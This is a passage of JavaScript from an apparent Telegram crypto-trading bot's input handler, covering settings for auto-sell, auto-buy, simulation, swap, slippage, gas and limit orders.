			if (!session.pkey) {
				instance.sendMessage(privateId, `Please add your wallet in the setting and then try again`)
				return
			}

			let poolHistoryInfo = null
			if (stateNode.data.cmd === instance.OPTION_MSG_SELL_PERCENT_X)
				poolHistoryInfo = await database.selectPoolHistory({pool_id: poolId})
			else {
				// poolHistoryInfo = await database.selectPanelHistory({panel_id: poolId})
				poolHistoryInfo = await database.selectTokenPanelHistory({token_id: poolId})
			}
				console.log(poolHistoryInfo)
			if (poolHistoryInfo) {
				let tokenAddress = poolHistoryInfo.token_address
				let version = poolHistoryInfo.version

				if (instance._callback_proc) {
					instance._callback_proc(instance.OPTION_MSG_SELL_PERCENT_X, { session, tokenAddress, ethAmount, version })
				}
			}
		}

	} else if (stateNode.state === instance.STATE_WAIT_SET_TOKEN_X_SELL) {

		const value = Number(msg.text.trim())
		if (value < 0.0001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. it must be greater than 0.0001`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		const poolId = stateNode.data.poolId

		let ethAmount = value

		if (session) {

			if (!session.pkey) {
				instance.sendMessage(privateId, `Please add your wallet in the setting and then try again`)
				return
			}

			let poolHistoryInfo = null
			if (stateNode.data.cmd === instance.OPTION_MSG_SELL_TOKEN_X)
				poolHistoryInfo = await database.selectPoolHistory({pool_id: poolId})
			else {
				// poolHistoryInfo = await database.selectPanelHistory({panel_id: poolId})
				poolHistoryInfo = await database.selectTokenPanelHistory({token_id: poolId})
			}

			if (poolHistoryInfo) {
				let tokenAddress = poolHistoryInfo.token_address
				let version = poolHistoryInfo.version

				if (instance._callback_proc) {
					instance._callback_proc(instance.OPTION_MSG_SELL_TOKEN_X, { session, tokenAddress, ethAmount, version })
				}
			}
		}

	} else if (stateNode.state === instance.STATE_WAIT_SET_TRADE_SELL_HI) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0 || value > 100000) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be between 0 to 100,000. Please try again`)
			return
		}

		session.trade_autosell_hi = value
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (high) threshold percentage setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_TRADE, k: privateId})
		return

	} else if (stateNode.state === instance.STATE_WAIT_SET_TRADE_SELL_LO) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value > 0 || value < -102) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be less than 0 and greater than -102%. Please try again`)
			return
		}

		session.trade_autosell_lo = value
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (low) threshold percentage setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_TRADE, k: privateId})
		return

	} else if (stateNode.state === instance.STATE_WAIT_SET_TRADE_SELL_HI_AMOUNT) {

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0.1 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be less than 0.1 and greater than 100%. Please try again`)
			return
		}

		session.trade_autosell_hi_amount = value
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (high) amount setting`)		
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_TRADE, k: privateId})
		return

	} else if (stateNode.state === instance.STATE_WAIT_SET_TRADE_SELL_LO_AMOUNT) {

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0.1 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be less than 0.1 and greater than 100%. Please try again`)
			return
		}

		session.trade_autosell_lo_amount = value
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (low) amount setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_TRADE, k: privateId})
		return

	} else if (stateNode.state === instance.STATE_WAIT_SET_TRADE_BUY_AMOUNT) {

		const session = instance.sessions.get(stateNode.data.sessionId, stateNode.data.messageId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the amount you entered must be greater than 0.01. Please try again`)
			return
		}

		session.trade_autobuy_amount = value
		session.trade_autobuy = 1; //RJM
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated auto buy amount setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_TRADE, k: privateId});
		return
	} else if (stateNode.state === instance.STATE_WAIT_ADD_AUTOSELLTOKEN) {

		const value = msg.text.trim()
		if (!utils.isValidAddress(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the address you entered is invalid. Please input again`)
			return
		}

		const tokenInfo = await utils.getTokenInfo(value)
		if (!tokenInfo) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the address you entered is invalid on ${afx.get_dexscreener_name()}.`)
			return
		}

		const price = await utils.getTokenPrice(utils.web3Inst, value)

		if (price > 0) {
			//await instance.removeMessage(privateId, msg.message_id)
			await database.addAutoSellToken(stateNode.data.sessionId, value, tokenInfo.name, tokenInfo.symbol, tokenInfo.decimal, price)
			await instance.sendInfoMessage(privateId, `✅ "${tokenInfo.symbol}" token has been successfuly added into auto-sell token list
Token address: <code>${tokenInfo.address}</code>
Current price: <code>${utils.roundEthUnit(price)}</code>`)

			//await instance.executeCommand(privateId, null, null, {c: instance.OPTION_MAIN_TRADE, k: `${privateId}:1`})
			await instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_TRADE, k: `${privateId}:0`})
		} else {
			instance.sendInfoMessage(privateId, `😢 Sorry, there was some errors on the command. Please try again later 😉`)
		}

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SIMULATION_TOKEN_ADDRESS) {

		const value = msg.text.trim()
		if (!utils.isValidAddress(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the address you entered is invalid. Please input again`)
			return
		}

		const tokenInfo = await utils.getTokenInfo(value)
		if (!tokenInfo) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the token address you entered is invalid.`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		await instance.sendMessage(privateId, `Simulation has been started ...`)

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })

		await simulator.simulationOne(utils.web3Inst, privateId, value);
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SIMULATION_SET_ETH) {

		const value = Number(msg.text.trim())
		if (value <= 0 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.simulation_invest_amount = value

		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Initial Investment ${afx.get_chain_symbol()} setting has been updated`)

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		instance.reloadCommand(privateId, stateNode.data.messageId, stateNode.data.callbackQueryId, {c: instance.OPTION_SIMULATION_SETTING, k: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SIMULATION_SET_TRAILING_STOP_LOSS) {

		const value = Number(msg.text.trim())
		if (value <= 0 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.simulation_trailing_stop_loss = value

		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Initial Trailing stop loss has been updated`)

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		instance.reloadCommand(privateId, stateNode.data.messageId, stateNode.data.callbackQueryId, {c: instance.OPTION_SIMULATION_SETTING, k: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SIMULATION_SET_PROFIT_TARGET) {

		const value = Number(msg.text.trim())
		if (value < 1 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.simulation_profit_target = value

		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Initial Profit target setting has been updated`)

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		instance.reloadCommand(privateId, stateNode.data.messageId, stateNode.data.callbackQueryId, {c: instance.OPTION_SIMULATION_SETTING, k: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SIMULATION_START_DATE
		|| stateNode.state === instance.STATE_WAIT_SIMULATION_END_DATE) {
		let value = 0
		try {
			value = new Date(msg.text.trim())
		} catch (error) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		if (stateNode.state === instance.STATE_WAIT_SIMULATION_START_DATE) {

			value.setHours(0)
			value.setMinutes(0)
			value.setSeconds(0)
			value.setMilliseconds(0)
			
			session.simulation_start_date = value.getTime()

		} else {

			if (value.getTime() < session.simulation_start_date) {
				instance.sendInfoMessage(privateId, `🚫 Sorry, the end date must be later than start date`)
				return
			}

			value.setHours(23)
			value.setMinutes(59)
			value.setSeconds(59)
			value.setMilliseconds(999)

			session.simulation_end_date = value.getTime()
		}

		await database.updateUser(session)

		if (stateNode.state === instance.STATE_WAIT_SIMULATION_START_DATE) {

			instance.sendInfoMessage(privateId, `✅ Initial Start date setting has been updated`)

		} else {

			instance.sendInfoMessage(privateId, `✅ Initial End date setting has been updated`)
		}

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })

		instance.reloadCommand(privateId, stateNode.data.messageId, stateNode.data.callbackQueryId, {c: instance.OPTION_SIMULATION_SETTING, k: stateNode.data.sessionId })
		return;
	} else if (stateNode.state === instance.STATE_WAIT_SWAP_BUY) {
		const address = msg.text.trim()
		if (utils.isValidAddress(address)) {
			
			const session = instance.sessions.get(privateId)
			const buyAmount = parseFloat(stateNode.data.amount)
			swapV2.buyToken(utils.web3HttpInst, database, session, address, buyAmount, afx.get_chain_symbol(), 'v2', async (msg) => {

				console.log(msg)
				instance.sendMessageToAuthorizedUser(session, msg, null)
			});
		} else {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the address you entered is invalid. Please input again`)
			return
		}
	} else if (stateNode.state === instance.STATE_WAIT_SWAP_BUY_X) {
		const value = Number(msg.text.trim())
		if (value < 0 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}
		const next_msg = '📝Enter the token address you wish to buy and send transaction immediately:'
		instance.sendReplyMessage(privateId, next_msg)

		instance.stateMap_setFocus(privateId, instance.STATE_WAIT_SWAP_BUY, { amount: value})
	} else if (stateNode.state === instance.STATE_WAIT_SWAP_SELL) {
		const address = msg.text.trim()
		if (utils.isValidAddress(address)) {
			
			const session = instance.sessions.get(privateId)
			const sell_amount = parseFloat(stateNode.data.amount)

			swapV2.sellToken(utils.web3HttpInst, database, session, address, sell_amount, 'PERCENT', 'v2', async (msg) => {

				console.log(msg)
				instance.sendMessageToAuthorizedUser(session, msg, null)
			});
		} else {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the address you entered is invalid. Please input again`)
			return
		}
	} else if (stateNode.state === instance.STATE_WAIT_SWAP_SELL_X) {
		const value = Number(msg.text.trim())
		if (value < 0 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}
		const next_msg = '📝Enter the percent you wish to sell and send transaction immediately:'
		instance.sendReplyMessage(privateId, next_msg)

		instance.stateMap_setFocus(privateId, instance.STATE_WAIT_SWAP_SELL, { amount: value})

	} else if (stateNode.state === instance.STATE_WAIT_SET_REFERRAL_WITHDRAW_WALLET) {

		const address = msg.text.trim()
		if (!utils.isValidAddress(address)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the wallet address you entered is invalid. Please input again`)
			return
		}
		
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)
		
		session.reward_wallet = address
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Your withdrawal wallet has been modified`)
		await instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_TRADE, k: `${privateId}:0`})
	} //=============================RJM=================================
	else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_BUY_SLIPPAGE) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < 0.1 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the slippage you entered must be between 0.1 to 100. Please try again`)
			return
		}

		// session.snipe_buy_slippage = value
		session.wallets[session.wallets_index].snipe_buy_slippage = parseInt(value)
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated slippage setting`)

		//=====================RJM=========================
		if (stateNode.data.jsonId == 1) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_setWalletConfig(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getConfigOptionMsg(session.chatid), menu.options)
		} else if (stateNode.data.jsonId == 2) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_quickSettings(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getQuickSetting(session), menu.options)
		}
		//=====================RJM=========================
		return
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_SELL_SLIPPAGE) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < 0.1 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the slippage you entered must be between 0.1 to 100. Please try again`)
			return
		}

		// session.snipe_sell_slippage = value
		session.wallets[session.wallets_index].snipe_sell_slippage = parseInt(value)
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated slippage setting`)

		//=====================RJM=========================
		if (stateNode.data.jsonId == 1) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_setWalletConfig(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getConfigOptionMsg(session.chatid), menu.options)
		} else if (stateNode.data.jsonId == 2) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_quickSettings(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getQuickSetting(session), menu.options)
		}
		//=====================RJM=========================
		return
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_BUY_GAS_DELTA) {
		console.log("STATE_WAIT_SET_SNIPE_BUY_GAS_DELTA")
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < 0 ) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the gas you entered must be between 0 to 100. Please try again`)
			return
		}

		// session.buy_gas_delta = value
		session.wallets[session.wallets_index].snipe_buy_gas_delta = parseInt(value)
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated gas setting`)
		//=====================RJM=========================
		if (stateNode.data.jsonId == 1) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_setWalletConfig(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getConfigOptionMsg(session.chatid), menu.options)
		} else if (stateNode.data.jsonId == 2) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_quickSettings(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getQuickSetting(session), menu.options)
		}
		//=====================RJM=========================
		return
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_SELL_GAS_DELTA) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < 0 ) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the gas you entered must be between 0 to 100. Please try again`)
			return
		}

		// session.sell_gas_delta = value
		session.wallets[session.wallets_index].snipe_sell_gas_delta = parseInt(value)
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated gas setting`)
		//=====================RJM=========================
		if (stateNode.data.jsonId == 1) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_setWalletConfig(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getConfigOptionMsg(session.chatid), menu.options)
		} else if (stateNode.data.jsonId == 2) {
			const item = instance.stateMap.get(session.chatid);
			const messageId = item.focus.data.messageId;
			const menu = await instance.json_quickSettings(session.chatid);
			if (menu)
				await instance.switchMenu(session.chatid, messageId, await instance.getQuickSetting(session), menu.options)
		}
		//=====================RJM=========================
		return
	} else if (stateNode.state === instance.STATE_WAIT_SET_LIMIT_ORDER_LO) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value > 0 || value < -102) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be less than 0 and greater than -102%. Please try again`)
			return
		}

		stateNode.data.limitOrderToken.sell_lo = value;
		session.limit_order_lo = value;
		await database.updateLimitOrderToken(stateNode.data.limitOrderToken)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (low) threshold percentage setting`)

		// instance.trackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)
		instance.tokenTrackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)
		return

	} else if (stateNode.state === instance.STATE_WAIT_SET_LIMIT_ORDER_HI) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0 || value > 100000) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be between 0 to 100,000. Please try again`)
			return
		}

		stateNode.data.limitOrderToken.sell_hi = value;
		session.limit_order_hi = value;
		await database.updateLimitOrderToken(stateNode.data.limitOrderToken)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (hi) threshold percentage setting`)

		// instance.trackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)
		instance.tokenTrackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)
		return

	} else if (stateNode.state === instance.STATE_WAIT_SET_LIMIT_ORDER_LO_AMOUNT) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0.1 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be less than 0 and greater than -102%. Please try again`)
			return
		}

		stateNode.data.limitOrderToken.sell_lo_amount = value;
		console.log("stateNode.data.limitOrderToken", stateNode.data.limitOrderToken)
		session.limit_order_lo_amount = value;
		await database.updateLimitOrderToken(stateNode.data.limitOrderToken)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (low) amount setting`)

		// instance.trackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)
		instance.tokenTrackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)

		return
	} else if (stateNode.state === instance.STATE_WAIT_SET_LIMIT_ORDER_HI_AMOUNT) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0.1 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the percentage you entered must be less than 0.1 and greater than 100%. Please try again`)
			return
		}

		stateNode.data.limitOrderToken.sell_hi_amount = value;
		session.limit_order_hi_amount = value;
		await database.updateLimitOrderToken(stateNode.data.limitOrderToken)

		instance.sendInfoMessage(privateId, `✅ Successfully updated sell (hi) amount setting`)

		// instance.trackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)
		instance.tokenTrackPanel(session.chatid, stateNode.data.panelId, stateNode.data.messageId)

		return
	} else if (stateNode.state === instance.STATE_WAIT_SET_PASTED_CONTRACT_BUY_AMT) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value === null || isNaN(value) || value < 0.00001 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the amount you entered must be less than 0.00001. Please try again`)
			return
		}

		// stateNode.data.pasted_contract_buy_amt = value;
		session.quick_pasted_contract_buy_amt = value;
		await updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated immediate buy amount on pasted constract token`)
		const item = instance.stateMap.get(session.chatid);
		const messageId = item.focus.data.messageId;
		const menu = await instance.json_quickSettings(session.chatid);
		if (menu)
			await instance.switchMenu(session.chatid, messageId, await instance.getQuickSetting(session), menu.options)
		return
	}
	//===================================================================
}
